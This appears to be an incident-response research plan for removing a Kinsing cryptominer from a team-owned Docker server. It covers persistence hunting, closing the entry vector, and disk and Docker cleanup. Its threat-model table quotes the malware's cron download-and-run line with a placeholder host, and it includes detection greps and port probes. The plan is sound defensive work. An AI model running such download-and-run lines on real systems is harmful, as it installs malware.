# Phase 24: Cleanup (gated on audit) — Research

**Researched:** 2026-06-30
**Domain:** Live-host malware remediation (Kinsing/kdevtmpfsi) on a team-owned, compromised Docker droplet, in place, without rebuild; plus safe Docker/log disk reclaim.
**Confidence:** HIGH on malware persistence/detection mechanics and Docker/log reclaim semantics; MEDIUM on the entry vector (must be diagnosed at execute-time on the live box — research gives CHECK commands + a decision tree, not an assumed vector).

---

<user_constraints>
## User Constraints (from 24-CONTEXT.md)

### Locked Decisions
- **D-01 — Remediate the malware INSIDE Phase 24 (not just escalate).** Investigate persistence + likely entry vector (exposed Docker API, `django runserver` :8000 with DEBUG, Redis broker), remove Kinsing + `kdevtmpfsi` cleanly, verify the host stays clean **without** the per-minute `kill.sh`. After a verified-clean window, retire `kill.sh` from the system crontab and remove the 4.4 GB `kill.log`. NOTIFY the team (they own the host). Keep "no Oxylabs creds on the box until remediation verified" in force — P24 gates the droplet's prod Hemnet fetch.
- **D-02 — Cleared apps: disable/confirm ONLY, drop nothing.** Confirm block_inc/procore/spotify beat tasks stay disabled (`last_run=None`). Remove ONLY the stale orphan container `hemnet-django-run-e2e3a39dc795`. Reclaim ~10.2 GB dangling/unused Docker images — **never the live `hemnet` image** the 7 running containers use. **Drop NO DB tables. Do NOT touch the team repo modules.**
- **D-03 — DB `simple_history` bloat (~49 GB): deferred.** Not touched in P24 (shared external managed Postgres; separate coordinated DB task).
- **D-04 — Disk reclaim (CLEAN-02), in safety order:** `scraper_log_export/` 6.6 GB (archive off-box first only if operator wants it retained) → reclaimable Docker images ~10.2 GB → `kill.log` 4.4 GB (only AFTER `kill.sh` retired, else it regrows).
- **D-05 — `authorized_keys` hygiene:** rewrite `/root/.ssh/authorized_keys` one key per line to clear the inert dangling RSA blob on line 1. **Verify access preserved before/after — do not lock the operator out.**
- **D-06 — Reversibility on a team-owned, compromised host:** in place, audit-before-kill, reversible-first. Every destructive step operator-gated with a documented revert path. Record state before each removal (container/image IDs, crontab backup, file listings). **No push to team `main`. Prefer removing/observing over adding secrets; do not reintroduce Oxylabs creds.**
- **D-07 — Sequencing:** malware remediation precedes/accompanies disk+container cleanup; `kill.log` removal depends on `kill.sh` retirement; CLEAN-03 (Hemnet is primary workload) is the end verification. Phase 25 stays gated on this phase.

### Claude's Discretion
- Exact remediation tooling/commands (process-tree inspection, persistence hunt across cron/systemd/`/tmp`/`/dev/shm`/LD_PRELOAD/Docker, file integrity).
- Log-rotation mechanism (logrotate config vs one-shot truncate/remove) and whether to archive `scraper_log_export` off-box before deletion (default: confirm with operator).
- Whether the verified-clean observation window is hours or a day before retiring `kill.sh`.
- Exact form of team notification (audit doc + escalation note).
- Verification-evidence format (a `24-VERIFICATION` evidence doc mirroring `22-EVIDENCE.md`).

### Deferred Ideas (OUT OF SCOPE)
- Reclaiming the ~49 GB `simple_history` DB bloat — separate coordinated, backed-up DB task.
- Dropping the dead block_inc/procore tables — left in place.
- Removing spotify/procore/block_inc app modules from the team repo — team's call.
- Hardening `django runserver`/`DEBUG` on the prod box — later phase UNLESS it turns out to be the malware entry vector (then it folds into D-01).
- Droplet resize — Phase 25.
</user_constraints>

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| **CLEAN-01** | Audit-cleared apps (spotify/procore/block_inc) removed/disabled. Per D-02: satisfied by *confirming* beat tasks disabled (`last_run=None`) + removing the orphan container + reclaiming dangling images. No table/code removal. | §"Safe In-Place Reclaim" (confirm-disabled + orphan removal commands); §"Verification" (evidence that beat tasks stay disabled). |
| **CLEAN-02** | Oversized logs rotated/removed, disk reclaimed, container set reduced to essentials. | §"Safe In-Place Reclaim" (open-file-handle nuance, `docker image prune` semantics, truncate-vs-rm, before/after `df`/`docker system df`). |
| **CLEAN-03** | End-state: Hemnet price scraper is the primary workload on the droplet. | §"Verification" (running-set inventory: 7 hemnet containers up, orphan gone, no malware processes, no kill.sh). |
</phase_requirements>

## Summary

Phase 24 has two very different risk profiles bolted together. The **disk/container reclaim** (CLEAN-01/02/03 mechanics) is routine, low-risk Linux/Docker hygiene with well-understood semantics — the only real traps are pruning the live image by accident and the "deleted an open log file but space didn't free" foot-gun. The **malware remediation (D-01)** is the genuinely high-stakes, unfamiliar part and is where planning effort should concentrate.

The critical reframing for the planner: **`kill.sh` has been suppressing the *symptom* (the `kinsing`/`kdevtmpfsi` processes) every minute for a long time, which means the actual *persistence mechanism* — whatever re-spawns the miner — has never been removed, only out-run.** The visible system crontab contains only `kill.sh` itself, so the re-infection source is somewhere the audit did not enumerate: another user's crontab, `/etc/cron.d/*`, a systemd unit/timer, an `/etc/ld.so.preload` rootkit, a malicious container/image, an SSH `authorized_keys` backdoor, or *continuous external re-exploitation* of an exposed service (Docker API / Redis / the dev web server). Remediation is not "kill the process"; it is "find and remove every persistence foothold, close the entry vector, then prove re-infection does not occur with `kill.sh` switched off."

**Primary recommendation:** Run the remediation as a strictly ordered, reversible, operator-gated runbook: (1) snapshot/evidence the current state; (2) **decloak** any LD_PRELOAD rootkit so `ps`/`ss`/`lsof` tell the truth; (3) enumerate and back up every persistence location before touching it; (4) identify the open entry vector by inspecting which ports listen on `0.0.0.0` and are reachable externally, and close it at the **DigitalOcean Cloud Firewall** layer (repo-edit-free, does not require touching the team's compose); (5) remove persistence + payloads; (6) **disable but do not yet delete** `kill.sh` and watch for re-infection over an observation window; (7) only after a verified-clean window, retire `kill.sh` and delete `kill.log`; (8) do the disk/image/log reclaim; (9) record reversible state + verification evidence throughout. A controlled reboot (access survives reboots by construction per the runbook) is the strongest single "is it really gone?" test and should be offered as an operator-gated final confirmation, because it clears tmpfs-resident (`/tmp`, `/dev/shm`, `/run`) payloads and re-runs all boot persistence.

## Architectural Responsibility Map

This is an infra/ops phase; "tiers" are operational layers on/around the droplet, not application tiers. Capabilities map to where the action and the authority live.

| Capability | Primary Layer | Secondary Layer | Rationale |
|------------|--------------|-----------------|-----------|
| Malware process/payload removal | Droplet host OS (root shell) | Inside containers (`docker exec`) | Payloads land on host fs (`/tmp`,`/etc`,`/var/tmp`,`/dev/shm`); the miner may also live in a container. Must check both. |
| Persistence removal (cron/systemd/ld.so.preload/keys) | Droplet host OS | — | All host-level; not in the team repo. |
| Entry-vector closure | **DO Cloud Firewall** (network, upstream of droplet) | Host firewall (ufw/iptables) / Redis `requirepass` | Cloud Firewall closes ports without editing the team's docker-compose (D-02/D-06). Docker's own iptables rules bypass host ufw, so the cloud layer is the correct, repo-edit-free control. |
| Docker image/container reclaim | Droplet host OS (Docker engine) | — | Local engine state; no repo or DB change. |
| Log reclaim / rotation | Droplet host OS (filesystem) | — | On-disk files; truncate/rm/logrotate on the host. |
| `authorized_keys` hygiene | Droplet host OS (`/root/.ssh`) | DO account keys (future droplets only) | On-disk file is the live access mechanism; account keys do not inject into an existing droplet. |
| Verification evidence + docs | This repo (`.planning/`, `docs/`) | — | Deliverable is `24-VERIFICATION` + audit/runbook updates, NOT new modules. |
| Team notification | Out-of-band (operator → team) | — | Team owns the host; they must know it was compromised + remediated. |

**Planner sanity-check (updated 2026-06-30 for the ownership clarification / D-08):** The host/DO-network layer is still the FIRST-choice control, and the host-level remediation plans (24-01..04) stay repo-edit-free. BUT the operator owns the scraper repo `hem-bol-scrapers`, so **repo edits ARE permitted in the final durable-hardening wave (24-05) per D-08** — done reversibly on a feature branch (mirror Phase 23), never on `main`, with a prior-image rollback tag and a scraper re-verify after rebuild. So: for 24-01..04, a task editing `docker-compose.yml`/`settings/base.py`/`apps/*` is still a violation (re-route to firewall/host control); for 24-05, such edits are the intended durable fix (each with a firewalled-interim escape hatch). The original D-02/D-06 "no team-repo edits" line is SUPERSEDED by the authoritative 24-CONTEXT.md D-06/D-08.

## Threat Model: How Kinsing/kdevtmpfsi Persists and Spreads

`kinsing` is the Go-based C2/dropper; `kdevtmpfsi` is the XMRig-derived cryptominer it launches. `kinsing` continuously monitors that `kdevtmpfsi` is running and relaunches it — which is exactly why a process-kill loop like `kill.sh` never wins. [CITED: huntress.com/threat-library/malware/kinsing], [CITED: securityweek.com Kinsing container analysis]

**Persistence mechanisms to hunt (all observed in the wild):**

| Mechanism | Where to look | Notes |
|-----------|---------------|-------|
| **Cron (system)** | `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.hourly|daily|weekly|monthly/*` | Classic Kinsing re-download line: `*/1 * * * * wget|curl <ip>/d.sh | sh`. [CITED: trendmicro / aquasec] |
| **Cron (per-user)** | `crontab -l -u root`, **and every user** incl. `raymondsunartio`, `tomtopfer`; `/var/spool/cron/crontabs/*` | The audit only dumped the system crontab (which held `kill.sh`). Per-user spools were NOT enumerated — prime suspect for the re-spawner. |
| **systemd unit/timer** | `/etc/systemd/system/*`, `/lib/systemd/system/*` (e.g. `bot.service`), `systemctl list-units --all`, `systemctl list-timers --all` | Kinsing installs a service (often named `bot`) to relaunch on boot. [CITED: huntress, sysdig] |
| **LD_PRELOAD rootkit** | `/etc/ld.so.preload`, `/etc/libsystem.so` (or similar `.so`) | Hides the miner from `ps`/`top`/`lsof`. **Decloak first** (see below) or your detection lies to you. [CITED: trendmicro rootkit analysis, sandflysecurity log4j-kinsing] |
| **Payload staging dirs** | `/tmp`, `/var/tmp`, `/dev/shm`, hidden dirs like `/tmp/.ICEd-unix/`, `/dev/shm/.X11-unix` | Binaries `kdevtmpfsi`, `kinsing`, `unk.sh`, `d.sh`, `spr.sh` drop here. tmpfs dirs clear on reboot. [CITED: sysdig, aquasec] |
| **Malicious Docker container/image** | `docker ps -a`, `docker images`, look for unexpected `alpine`/`ubuntu` containers running `wget|sh` | Via exposed Docker API, Kinsing spins up its own container that mounts the host fs and writes cron. Here the audit shows only `hemnet`-image containers + the orphan, but re-verify at execute-time. [CITED: aquasec, latesthackingnews] |
| **SSH backdoor** | `/root/.ssh/authorized_keys` (+ every user's), `~/.ssh/config`, `.bash_history`, `known_hosts` | Kinsing harvests SSH config/known_hosts for lateral movement and can add keys. The dangling RSA blob on line 1 is *inert* per audit, but re-audit the whole file for unknown keys. [CITED: trendmicro lateral-movement] |

**Lateral movement note:** Kinsing reads `/.ssh/config`, `.bash_history`, `/.ssh/known_hosts` and tries `ssh -oBatchMode=yes` into known hosts to spread. Because the cohort-tracker droplet (`170.64.197.241`) and this box are different accounts, confirm no cross-host key/known_hosts linkage was abused. [CITED: trendmicro]

## Entry Vector: Check Commands + Decision Tree (diagnose at execute-time)

Kinsing's top entry vectors are **exposed Docker daemon API (2375/2376, no auth), unauthenticated/weak Redis (RCE via `CONFIG SET` to write a cron job), and vulnerable/exposed web apps** (Log4j, ActiveMQ, weak PostgreSQL `trust` auth, dev servers). This box exposes candidates for all three categories. Do NOT assume which one is open — run the checks. [CITED: aquasec, trendmicro exposed-Redis, securityscientist]

**Step 1 — Enumerate what actually listens and on which interface:**
```bash
ss -tlnp                       # all listening TCP sockets + owning process
ss -tlnp | grep -E ':2375|:2376|:6379|:8000|:3000|:25060'
```
Anything bound to `0.0.0.0` / `*` (not `127.0.0.1` and not a docker-internal bridge IP) is potentially internet-reachable.

**Step 2 — Per-candidate checks:**

| Candidate | Check | "Open / vulnerable" signal |
|-----------|-------|----------------------------|
| Docker API | `ss -tlnp \| grep -E ':2375\|:2376'`; `ps aux \| grep dockerd` (look for `-H tcp://0.0.0.0`); `cat /etc/docker/daemon.json` | dockerd listening on a TCP socket at all. The compose uses `.:/app` bind mounts but the audit did not confirm the daemon socket binding — **check.** |
| Redis | `docker port hemnet-redis`; `ss -tlnp \| grep :6379`; `docker exec hemnet-redis redis-cli CONFIG GET requirepass`; `docker exec hemnet-redis redis-cli CONFIG GET dir` | Port published to host/`0.0.0.0` AND no `requirepass` = classic RCE vector. (Audit shows broker-only, 5 keys — but does not confirm the *publish* scope.) |
| Django dev server | `ss -tlnp \| grep :8000`; is `8000` published to `0.0.0.0`? `DEBUG=True` in `settings` | `runserver` + `DEBUG` exposed publicly is an info-leak/RCE-adjacent risk. If this is the vector, hardening it folds into D-01 (per Deferred note). |
| Metabase | `ss -tlnp \| grep :3000`; version `v0.47.1` (old — has known CVEs incl. pre-auth RCE CVE-2023-38646 in some 0.4x) | Publicly exposed old Metabase is a real RCE candidate. Verify reachability + version. |
| External managed PG | Not on this box (managed DO PG). `trust` auth unlikely on managed. | Lower priority; managed PG enforces password+SSL. |

**Step 3 — Confirm external reachability (not just local bind):** check the DO Cloud Firewall and host firewall:
```bash
ufw status verbose                       # host firewall (may be inactive)
iptables -S | grep -E '2375|6379|8000|3000'
# From operator workstation (off-box), confirm what is actually reachable from the internet:
nc -zv 170.64.181.89 2375 2376 6379 8000 3000
# DO Cloud Firewall state (needs doctl auth — see Environment Availability):
doctl compute firewall list
doctl compute droplet get 357087018 --format ID,Name,Tags   # which firewall/tags apply
```

**Decision tree:**
- **A port is bound `0.0.0.0` AND reachable from the internet (nc succeeds off-box):** that is the live vector. Close it at the **DO Cloud Firewall** (default-deny inbound, allow only SSH 22 from operator/team IPs). This requires NO compose edit (D-06-safe). For Redis specifically, also confirm it is not host-published; a broker only needs the docker-internal network.
- **Nothing is externally reachable but re-infection still recurs:** the foothold is *local* (cron/systemd/ld.so.preload/container) — there is no external re-exploit; removing persistence will hold. This is the better-case outcome.
- **Cannot reach doctl / cannot confirm at network layer:** fall back to host-level firewall (ufw/iptables) BUT note Docker publishes ports by inserting its own iptables rules that bypass ufw's filter chain — so a host ufw rule may not actually block a docker-published port. The DO Cloud Firewall (upstream of the droplet NIC) is not bypassable this way and is the correct control. [CITED: docs.digitalocean.com/products/networking/firewalls]

## In-Place Remediation Runbook (ordered, reversible, operator-gated)

> This is the recommended shape for the planner, not a script to run blind. Each destructive step is gated and has a revert path (D-06). Capture evidence into a `24-VERIFICATION` doc mirroring `22-EVIDENCE.md`.

**Phase R0 — Evidence + reversibility snapshot (read-only):**
```bash
# Back up everything you might remove, BEFORE touching it:
crontab -l > /root/24-backup/root.crontab.bak                 # system/root crontab
for u in root raymondsunartio tomtopfer; do crontab -l -u $u > /root/24-backup/$u.crontab.bak 2>/dev/null; done
cp -a /etc/cron.d /root/24-backup/cron.d.bak
ls -la /var/spool/cron/crontabs/ > /root/24-backup/spool-cron.txt
systemctl list-units --all --type=service > /root/24-backup/systemd-units.txt
systemctl list-timers --all > /root/24-backup/systemd-timers.txt
cp -a /root/.ssh/authorized_keys /root/24-backup/authorized_keys.bak
docker ps -a > /root/24-backup/docker-ps.txt
docker images --digests > /root/24-backup/docker-images.txt
df -h / && docker system df > /root/24-backup/disk-before.txt
ps auxf > /root/24-backup/ps-before.txt
ss -tlnp > /root/24-backup/listening-before.txt
```

**Phase R1 — Decloak the rootkit (so detection tells the truth):**
```bash
ls -la /etc/ld.so.preload 2>/dev/null && cat /etc/ld.so.preload   # often references a hiding .so
# If present and suspicious, neutralize reversibly (do NOT rm yet):
mv /etc/ld.so.preload /root/24-backup/ld.so.preload.disabled
```
After this, `ps`/`top`/`ss`/`lsof` reveal previously hidden `kinsing`/`kdevtmpfsi`. [CITED: huntress, sandflysecurity] If `/etc/ld.so.preload` is absent, note "None — no LD_PRELOAD rootkit present (verified by absence)."

**Phase R2 — Locate live payloads + persistence (read-only enumeration after decloak):**
```bash
ps auxf | grep -Ei 'kinsing|kdevtmp|xmrig|\bbot\b'
for d in /tmp /var/tmp /dev/shm /etc /root; do find $d -maxdepth 3 -iname 'kdevtmpfsi' -o -iname 'kinsing' 2>/dev/null; done
ls -la /tmp /var/tmp /dev/shm        # hidden dotdirs, recently-modified binaries
grep -RiE 'wget|curl' /etc/cron* /var/spool/cron/crontabs 2>/dev/null   # download-and-run lines
```

**Phase R3 — Identify + close the entry vector** (see decision tree above). Operator-gated. Prefer DO Cloud Firewall default-deny inbound (SSH only).

**Phase R4 — Remove persistence (reversible: everything was backed up in R0):**
- Remove malicious cron lines (system, per-user, `/etc/cron.d`, spool). Keep backups.
- `systemctl stop && systemctl disable <bad>.service`; move its unit file to backup (don't delete until verified).
- Remove unknown SSH keys (cross-check against the 3 known keys; D-05 rewrite happens here too — see Pitfalls for the lock-out guard).
- Remove malicious containers/images if any unexpected ones appeared (NOT the `hemnet` image).

**Phase R5 — Kill the live processes ONE more time, then observe:**
- Kill `kinsing` first (it relaunches the miner), then `kdevtmpfsi`.
- **Disable `kill.sh` but DO NOT delete it yet** — comment out its crontab line (reversible) so the symptom-suppressor is off and you can observe whether the miner returns:
  ```bash
  crontab -l | sed 's#^\* \* \* \* \* /home/raymondsunartio/kill.sh.*#\#&#' | crontab -
  ```
- Watch over the observation window (operator's call, hours→1 day per D-01 discretion):
  ```bash
  watch -n 30 "ps aux | grep -Ei 'kinsing|kdevtmp' | grep -v grep; cat /etc/ld.so.preload 2>/dev/null"
  ```
- **Re-infection within minutes** ⇒ a foothold remains (or external re-exploit ongoing) — return to R2/R3; re-enable `kill.sh` if you must step away.

**Phase R6 — (Optional, strongest confirmation) controlled reboot, operator-gated:** access survives reboot by construction (runbook: `authorized_keys` on persistent `/dev/vda1`, `sshd PubkeyAuthentication yes`). A reboot clears tmpfs payloads (`/tmp`,`/dev/shm`,`/run`) and re-runs every boot-persistence path — if the miner does NOT come back after a clean reboot with `kill.sh` disabled, that is strong evidence of a clean kill. Confirm the 7 hemnet containers auto-restart (they show `Up 2 months`; check their restart policy first: `docker inspect -f '{{.HostConfig.RestartPolicy.Name}}' hemnet-django`).

**Phase R7 — Retire `kill.sh` + delete `kill.log` (only after verified-clean window, D-01):**
```bash
crontab -l | sed '/kill.sh/d' | crontab -        # fully remove the line (backup exists)
rm -f /home/raymondsunartio/kill.log             # 4.4 GB; safe ONLY now that nothing appends to it
```

## Safe In-Place Reclaim (live prod Docker host)

### Confirm cleared apps stay disabled (CLEAN-01, D-02 — no removal)
```bash
docker exec hemnet-django python manage.py shell -c \
 "from django_celery_beat.models import PeriodicTask; \
  print([(t.name,t.enabled,t.last_run_at) for t in PeriodicTask.objects.all()])"
```
Expect every scrape task `enabled=False, last_run_at=None` (block_inc/procore/spotify AND hemnet/booli), only `celery.backend_cleanup` enabled — matches audit §3. Record as evidence. No code/table change.

### Remove the stale orphan container (the ONLY container kill target)
```bash
docker inspect hemnet-django-run-e2e3a39dc795 > /root/24-backup/orphan-inspect.json   # reversible record
docker stop hemnet-django-run-e2e3a39dc795
docker rm   hemnet-django-run-e2e3a39dc795
```
Revert path: it is a `docker run` artifact, not a compose service — re-creatable from `bin/` if ever needed; capture its full config first.

### Reclaim Docker images WITHOUT touching the live `hemnet` image
`docker image prune` semantics: [CITED: docs.docker.com/engine/reference/commandline/image_prune]
- `docker image prune` (no flags) removes **dangling** images only (untagged `<none>:<none>`, not referenced by any tag). Safe — the live `hemnet` image is tagged and in use.
- `docker image prune -a` removes **every image not used by an existing container** — more aggressive but, because the 7 hemnet containers reference the `hemnet` image, that image is protected. Verify first:
```bash
docker ps -a --format '{{.Image}}' | sort -u                 # images actually referenced
docker images                                                # see what's dangling/unused
docker image prune            # start conservative (dangling only)
# Only if more reclaim needed and after confirming the in-use set:
docker image prune -a --filter "until=720h"                  # >30d old, unused only
```
**Guard:** Docker will never remove an image that a (running or stopped) container references — so the orphan-container removal above must happen *first* if any reclaim target image was held only by the orphan. Record `docker system df` before/after. Expect ~10.2 GB reclaimed (audit: 10.19 GB / 95% reclaimable). Also `docker builder prune` for the 4.8 MB build cache (trivial).

### Log reclaim — the open-file-handle trap (CLEAN-02, D-04)
**Critical nuance:** `rm`-ing a log file that a process still holds open does **not** free the space — the inode persists until the holding process closes/restarts; the file just becomes invisible (`df` unchanged, recoverable via `/proc/<pid>/fd`). [VERIFIED: standard Linux fs behavior]

Procedure per target:
```bash
# Is anything holding the file open?
lsof /home/raymondsunartio/kill.log
lsof +D /var/www/apps/hemnet/scraper_log_export
```
- **`kill.log`** is appended by the `kill.sh` cron each minute (short-lived process, no persistent handle), so a plain `rm` frees space — but only do it AFTER `kill.sh` is retired (D-04/D-07), else it regrows. If you must keep `kill.sh` running for now, `> kill.log` (truncate) reclaims space while preserving the inode the running append targets.
- **`scraper_log_export/`** — these are Nov–Dec 2025 one-off export files; check no live writer holds them (`lsof +D`). Default per D-04: confirm with operator whether to archive off-box first (`scp` to operator workstation or a DO Space) before `rm -rf scraper_log_export/`. If a file IS held open by a running container, **truncate, don't rm** (`truncate -s 0 <file>` or `: > <file>`), or the space won't return until restart.
- For any *actively-written* hemnet container log (not in scope to delete, but if rotation is wanted): use `logrotate` with `copytruncate`, or Docker's `json-file` log driver `max-size`/`max-file` — but the latter is a daemon/compose setting; setting it on the daemon (`/etc/docker/daemon.json`) is host-level (allowed), editing compose is NOT (D-02). Default recommendation: leave live logs alone this phase; only remove the static `scraper_log_export` + `kill.log`.

### `authorized_keys` hygiene (D-05) — with lock-out guard
```bash
cp -a /root/.ssh/authorized_keys /root/24-backup/authorized_keys.bak   # already in R0
# Rewrite one key per line. Keep an OPEN second SSH session as a safety net before/during.
# Verify the 3 known good keys survive (Tom ed25519, raymondsunartio rsa, julian-droplet ed25519);
# the trailing dangling ssh-rsa ...rsa-key-20230525 blob is inert and should be dropped.
```
**Guard (Pitfall below):** never edit `authorized_keys` without a second live session already connected; verify a fresh `ssh` login works from the operator workstation BEFORE closing the safety session.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| "Is it really gone?" detection while a rootkit may be hiding processes | A `ps \| grep` loop (what `kill.sh` already does — and lost to) | Decloak `/etc/ld.so.preload` first, then `ps/ss/lsof`; consider a one-shot read-only scanner (`chkrootkit`/`rkhunter` if installed, or Sandfly-style stat checks) | A grep loop races the malware forever and is blind to LD_PRELOAD hiding. The audit's own `kill.sh` is the cautionary tale. |
| Closing the entry port | Editing the team's `docker-compose.yml` port mappings | DO Cloud Firewall default-deny inbound (allow SSH only) | Compose edits violate D-02/D-06; Docker iptables also bypass host ufw. Cloud Firewall is upstream + repo-edit-free. |
| Freeing log disk | `rm` on a possibly-open log | `lsof` first, then `truncate`/`: >` for held files, `rm` only for unheld | rm on an open file frees nothing until the holder restarts. |
| Reclaiming images | `docker rmi` of specific IDs by eyeball | `docker image prune` (dangling) → verify in-use set → `prune -a --until` | Manual `rmi` risks the live image; prune respects container references by design. |

**Key insight:** In this domain the dangerous move is *acting on what you can see* when a rootkit is curating what you see, and *deleting before confirming nothing holds a handle / nothing references an image*. Decloak-then-observe and back-up-then-remove are the whole game.

## Common Pitfalls

### Pitfall 1: Removing `kill.sh` before the persistence is gone → re-infection storm
**What goes wrong:** Retiring the per-minute killer while a cron/systemd/container foothold remains lets `kdevtmpfsi` run unbounded, spiking CPU and re-establishing.
**Why:** `kill.sh` suppressed the symptom for so long the root foothold was never found.
**Avoid:** D-07 sequencing — disable (not delete) `kill.sh`, observe a clean window, only then retire. Keep the crontab backup to re-enable instantly.
**Warning signs:** `kdevtmpfsi` reappears within minutes of disabling `kill.sh`; CPU load jumps from ~0.2 toward 8.

### Pitfall 2: Trusting `ps`/`top` while an LD_PRELOAD rootkit hides the miner
**What goes wrong:** You "confirm clean" but the rootkit filtered the miner out of `ps`/`ss`/`lsof` output.
**Avoid:** Inspect/neutralize `/etc/ld.so.preload` FIRST; re-check after a reboot (rootkit re-loads from disk on boot).
**Warning signs:** High CPU with no visible culprit; `/etc/ld.so.preload` non-empty; discrepancy between `ls /proc/*/exe` and `ps`.

### Pitfall 3: Pruning the live `hemnet` image / stopping a live container
**What goes wrong:** `docker image prune -a` run before confirming the in-use set, or removing a wrong container, takes the price scraper down.
**Avoid:** Enumerate `docker ps -a --format '{{.Image}}'` first; start with dangling-only prune; the 7 hemnet containers protect the `hemnet` image by reference. Only `hemnet-django-run-e2e3a39dc795` is a removal target.
**Warning signs:** `docker images` no longer lists `hemnet`; containers exit on next restart.

### Pitfall 4: Deleting a log that's an open file handle → no space freed
**What goes wrong:** `rm bigfile.log` while a process holds it open; `df` shows no change, space returns only on process restart.
**Avoid:** `lsof` the file first; `truncate -s 0` / `: > file` if held; `rm` only if unheld. For `kill.log`, only after `kill.sh` retired.
**Warning signs:** `df` unchanged after `rm`; `lsof | grep deleted` shows the phantom inode.

### Pitfall 5: Locking the operator out while rewriting `authorized_keys`
**What goes wrong:** A typo/format error drops the live key; the box is `root`-only with no console password.
**Avoid:** Keep a second live SSH session open; back up the file; verify a fresh login succeeds BEFORE closing the safety session. Access is recoverable via DO web Console if needed, but avoid the round-trip.
**Warning signs:** `Permission denied (publickey)` on a fresh session (and remember the `IdentitiesOnly` gotcha — that can cause a *false* denial; rule it out first).

### Pitfall 6: Doing anything that needs a team-`main` change
**What goes wrong:** Hardening the dev server / Redis by editing compose or settings = forbidden team-repo edit (D-02/D-06).
**Avoid:** Close vectors at the network layer (DO Cloud Firewall) or host/daemon layer; if the only real fix is a compose/code change, that becomes a *team notification*, not a P24 action.

### Pitfall 7: `find / -exec rm` style remediation hammering disk/IO on a prod box
**What goes wrong:** Repeating the `kill.sh` pattern (full-fs walks every minute) wastes IO and bloats logs — the very problem being cleaned up.
**Avoid:** Targeted `find` in known staging dirs (`/tmp /var/tmp /dev/shm /etc /root`) with `-maxdepth`, run once, not on a loop.

## Verification (CLEAN-01/02/03 + clean-host evidence)

Capture all of this into `24-VERIFICATION` (mirror `22-EVIDENCE.md` format). Evidence that proves done:

| Claim | Evidence command | Expected |
|-------|------------------|----------|
| Malware processes gone | `ps auxf \| grep -Ei 'kinsing\|kdevtmp\|xmrig'` (after decloak) | no matches |
| No rootkit | `cat /etc/ld.so.preload` | absent / empty (and backed up if removed) |
| No re-infection w/o kill.sh | observation-window log + post-reboot check | miner absent over window; CPU load back to ~0.2 |
| Persistence removed | cron (all users + `/etc/cron.d` + spool), `systemctl list-timers/units` | no wget/curl-pipe lines; no `bot`-style unit |
| Entry vector closed | `nc -zv` from off-box to 2375/6379/8000/3000; `doctl compute firewall list` | ports not reachable; default-deny inbound (SSH only) |
| kill.sh retired + log gone (CLEAN-02) | `crontab -l`; `ls -la /home/raymondsunartio/kill.log` | no kill.sh line; file absent |
| Cleared apps disabled (CLEAN-01) | PeriodicTask dump | all scrape tasks `enabled=False, last_run=None` |
| Orphan gone, images reclaimed (CLEAN-02) | `docker ps -a`; `docker system df` before/after | orphan absent; ~10 GB images reclaimed; live `hemnet` image present |
| Logs reclaimed (CLEAN-02) | `df -h /` before/after; `du -sh scraper_log_export` | `scraper_log_export` gone (or archived); disk used dropped ~21 GB toward target |
| Hemnet is primary workload (CLEAN-03) | `docker ps` | the 7 hemnet containers `Up`; nothing non-hemnet running; Playwright still gated off (Phase 23) |
| Access preserved (D-05) | fresh `ssh` login post-rewrite | succeeds; 3 known keys, one per line, no dangling RSA blob |

**Reversibility record (D-06):** the `/root/24-backup/` set (crontab/ssh/cron.d/systemd/docker-inspect/df snapshots) IS the revert path; copy it off-box into the `24-VERIFICATION` evidence so it survives the box.

## Runtime State Inventory (this IS a remediation/cleanup phase)

| Category | Items Found | Action Required |
|----------|-------------|------------------|
| Stored data | The malware's persistence is the "stored state": cron lines (system + **per-user spools NOT yet enumerated by audit**), possible systemd unit (`bot.service`), `/etc/ld.so.preload`, staged binaries in `/tmp`,`/var/tmp`,`/dev/shm`. | Enumerate + back up + remove (R0–R4). |
| Live service config | DO Cloud Firewall rules (if any) governing inbound to the droplet; Docker daemon socket binding (`/etc/docker/daemon.json`); Redis `requirepass`. These live in DO control plane / host, NOT in git. | Inspect; close vector at firewall layer. |
| OS-registered state | System crontab `kill.sh` line; any malicious systemd unit/timer; the 7 hemnet containers' restart policy (affects post-reboot behavior). | Retire kill.sh (after clean window); disable bad units; verify restart policy before any reboot. |
| Secrets/env vars | `/var/www/apps/hemnet/.env` holds `OXYLABS_*`, `DJANGO_SECRET_KEY`, `DATABASE_URL`, `MB_DB_*` (location only, redacted). On a compromised host these may be exfiltrated — **do not reintroduce/refresh Oxylabs creds on the box until verified clean (D-01).** Team should assume `.env` secrets potentially exposed and rotate post-remediation. | No new secrets added (D-06); flag rotation as team notification. |
| Build artifacts | The stale orphan container `hemnet-django-run-e2e3a39dc795`; ~10.2 GB dangling/unused Docker images; `kill.log` 4.4 GB; `scraper_log_export` 6.6 GB. | Remove per D-02/D-04 with backups. |

**Per-user cron spools — the one gap to close at execute-time:** audit §3 dumped only the system crontab (which is just `kill.sh`). `/var/spool/cron/crontabs/{root,raymondsunartio,tomtopfer}` were NOT enumerated and are the leading suspect for the actual re-spawner. State explicitly in evidence what was found there.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| SSH to droplet (`~/.ssh/droplet_ed25519`, `IdentitiesOnly` flags) | every action | ✓ (per runbook, verified 2026-06-29) | — | DO web Console |
| `doctl` (operator workstation) | DO Cloud Firewall inspect/apply; droplet/firewall list | ⚠ UNCERTAIN | — | DO web control panel (firewall via UI); runbook says re-authed 2026-06-29 but memory `project_ip_whitelist` notes token EXPIRED 2026-06-21 (401) — **re-verify `doctl auth` at execute-time** |
| `lsof`, `ss`, `find`, `systemctl`, `crontab` on droplet | persistence hunt + open-handle checks | ✓ likely (standard Ubuntu) | — | `/proc` inspection if a tool is missing |
| `chkrootkit` / `rkhunter` | optional rootkit corroboration | ✗ unknown | — | manual `/etc/ld.so.preload` + `ps/ss/lsof` decloak checks (sufficient) |
| `nc`/`ncat` on operator workstation | off-box reachability probe | ✓ likely | — | `nmap`, or `curl -v telnet://` |
| `gsd-sdk` CLI | (mentioned absent in this env) | ✗ | — | N/A — not needed; deliverables are droplet actions + docs |

**Missing dependencies with no fallback:** none that block — every check has a UI or `/proc` fallback.
**Blocking-if-unresolved:** `doctl` auth state must be confirmed before relying on CLI for the Cloud Firewall; otherwise use the DO web console.

## Validation Architecture

